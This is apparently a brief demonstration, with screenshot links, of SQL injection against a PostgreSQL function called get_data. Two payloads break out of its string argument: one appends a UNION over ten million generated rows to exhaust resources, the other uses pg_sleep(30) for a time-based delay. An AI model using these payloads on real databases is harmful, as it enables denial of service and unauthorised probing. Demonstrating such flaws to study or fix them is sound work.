```sql
select * from get_data('1'' union
(select a1, cast (a1 as varchar), a1
from
(select generate_series a1 from generate_series (1,1000)) t1
cross join
(select * from generate_series (1,1000)) t2
cross join
(select * from generate_series (1,10)) t3) -- ');
```

![1](https://user-images.githubusercontent.com/56599282/209482942-5444fc35-c918-462b-bb18-dd0bddfadadc.png)

```sql
select * from get_data('1'' or exists (select 1 from pg_sleep(30)) -- ');
```

![2](https://user-images.githubusercontent.com/56599282/209482944-a6b85396-a7b8-4874-a18c-4527a48f9b8f.png)
